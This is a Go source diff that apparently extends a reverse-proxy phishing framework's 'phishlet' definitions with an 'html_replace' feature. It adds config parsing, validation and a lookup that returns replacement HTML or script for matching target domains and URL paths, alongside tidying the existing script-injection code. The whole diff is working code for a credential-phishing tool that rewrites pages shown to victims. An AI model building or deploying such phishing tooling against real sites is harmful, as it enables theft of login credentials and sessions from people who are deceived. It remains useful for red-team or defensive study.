@@ -80,6 +80,12 @@ type JsInject struct {
 	script          string           `mapstructure:"script"`
 }
 
+type HtmlReplace struct {
+	trigger_domains []string `mapstructure:"trigger_domains"`
+	trigger_paths   []*regexp.Regexp `mapstructure:"trigger_paths"`
+	script string `mapstructure:"script"`
+}
+
 type Phishlet struct {
 	Site         string
 	Name         string
@@ -99,6 +105,8 @@ type Phishlet struct {
 	forcePost    []ForcePost
 	login        LoginUrl
 	js_inject    []JsInject
+	html_replace []HtmlReplace
+
 }
 
 type ConfigProxyHost struct {
@@ -167,6 +175,12 @@ type ConfigJsInject struct {
 	Script         *string   `mapstructure:"script"`
 }
 
+type ConfigHtmlReplace struct{
+	TriggerDomains *[]string `mapstructure:"trigger_domains"`
+	TriggerPaths *[]string `mapstructure:"trigger_paths"`
+	Script *string `mapstructure:"script"`
+}
+
 type ConfigPhishlet struct {
 	Name        string             `mapstructure:"name"`
 	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
@@ -178,6 +192,7 @@ type ConfigPhishlet struct {
 	LandingPath *[]string          `mapstructure:"landing_path"`
 	LoginItem   *ConfigLogin       `mapstructure:"login"`
 	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
+	HtmlReplace *[]ConfigHtmlReplace `mapstructure:"html_replace"`
 }
 
 func NewPhishlet(site string, path string, cfg *Config) (*Phishlet, error) {
@@ -353,6 +368,24 @@ func (p *Phishlet) LoadFromFile(site string, path string) error {
 			}
 			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, *js.Script)
 			if err != nil {
+				return err
+			}
+		}
+	}
+
+	if fp.HtmlReplace != nil{
+		for _, html := range *fp.HtmlReplace{
+			if html.TriggerDomains == nil {
+				return fmt.Errorf("html_replace: missing `trigger_domains` field")
+			}
+			if html.TriggerPaths == nil {
+				return fmt.Errorf("html_replace: missing `trigger_paths` field")
+			}
+			if html.Script == nil {
+				return fmt.Errorf("html_replace: missing `script` field")
+			}
+			err := p.addHtmlReplace(*html.TriggerDomains, *html.TriggerPaths, *html.Script)
+			if err != nil{
 				return err
 			}
 		}
@@ -614,25 +647,50 @@ func (p *Phishlet) GetLoginUrl() string {
 	return "https://" + p.login.domain + p.login.path
 }
 
-func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, error) {
-	for _, js := range p.js_inject {
-		host_matched := false
-		for _, h := range js.trigger_domains {
+func (p *Phishlet) GetHtmlReplace(hostname string, path string) (string, error){
+	for _, html := range p.html_replace {
+		hostMatched := false
+		for _, h := range html.trigger_domains {
 			if h == strings.ToLower(hostname) {
-				host_matched = true
+				hostMatched = true
 				break
 			}
 		}
-		if host_matched {
-			path_matched := false
-			for _, p_re := range js.trigger_paths {
-				if p_re.MatchString(path) {
-					path_matched = true
+		if hostMatched {
+			pathMatched := false
+			for _, pRe := range html.trigger_paths {
+				if pRe.MatchString(path) {
+					pathMatched = true
 					break
 				}
 			}
-			if path_matched {
-				params_matched := false
+			if pathMatched {
+				return html.script, nil
+			}
+		}
+	}
+	return "", fmt.Errorf("script not found")
+}
+
+func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, error) {
+	for _, js := range p.js_inject {
+		hostMatched := false
+		for _, h := range js.trigger_domains {
+			if h == strings.ToLower(hostname) {
+				hostMatched = true
+				break
+			}
+		}
+		if hostMatched {
+			pathMatched := false
+			for _, pRe := range js.trigger_paths {
+				if pRe.MatchString(path) {
+					pathMatched = true
+					break
+				}
+			}
+			if pathMatched {
+				paramsMatched := false
 				if params != nil {
 					pcnt := 0
 					for k, _ := range *params {
@@ -641,13 +699,13 @@ func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[str
 						}
 					}
 					if pcnt == len(js.trigger_params) {
-						params_matched = true
+						paramsMatched = true
 					}
 				} else {
-					params_matched = true
+					paramsMatched = true
 				}
 
-				if params_matched {
+				if paramsMatched {
 					script := js.script
 					if params != nil {
 						for k, v := range *params {
@@ -750,6 +808,24 @@ func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string,
 	js.script = script
 
 	p.js_inject = append(p.js_inject, js)
+	return nil
+}
+
+func (p *Phishlet) addHtmlReplace(trigger_domains []string, trigger_paths []string, script string) error {
+	htmlReplace := HtmlReplace{}
+	for _, d := range trigger_domains {
+		htmlReplace.trigger_domains = append(htmlReplace.trigger_domains, strings.ToLower(d))
+	}
+	for _, d := range trigger_paths {
+		re, err := regexp.Compile(d)
+		if err == nil {
+			htmlReplace.trigger_paths = append(htmlReplace.trigger_paths, re)
+		} else {
+			return fmt.Errorf("html_replace: %v", err)
+		}
+	}
+	htmlReplace.script = script
+	p.html_replace = append(p.html_replace, htmlReplace)
 	return nil
 }
 
